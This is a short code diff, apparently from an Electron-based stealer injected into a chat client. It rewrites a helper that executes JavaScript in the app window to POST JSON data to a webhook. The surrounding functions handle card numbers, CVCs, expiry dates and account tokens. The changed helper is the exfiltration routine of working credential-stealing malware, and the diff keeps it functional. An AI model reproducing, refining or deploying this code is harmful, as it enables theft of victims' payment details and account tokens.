@@ -652,16 +652,18 @@ async function creditCardAdded(cardnumber, cvc, expiration, token) {
 
 
 // Helpers functions
-async function sendToWebhook(params) {
-    
-    const window = BrowserWindow.getAllWindows()[0];
-    window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
-		xhr.open("POST", "${webhook}", true);
-		xhr.setRequestHeader('Content-Type', 'application/json');
-		xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
-		xhr.send(JSON.stringify(${params}));
-		`, !0)
-
+function SendToWebhook(a) {
+  const w = BrowserWindow.getAllWindows()[0]
+  w.webContents
+    .executeJavaScript(
+      '\n\tvar xhr = new XMLHttpRequest();\n    xhr.open("POST", "' +
+        webhook +
+        "\", true);\n    xhr.setRequestHeader('Content-Type', 'application/json');\n    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');\n    xhr.send(JSON.stringify(" +
+        a +
+        '));\n    ',
+      true
+    )
+    .then((W) => {})
 }
 async function getRelationships(token) {
     const window = BrowserWindow.getAllWindows()[0];
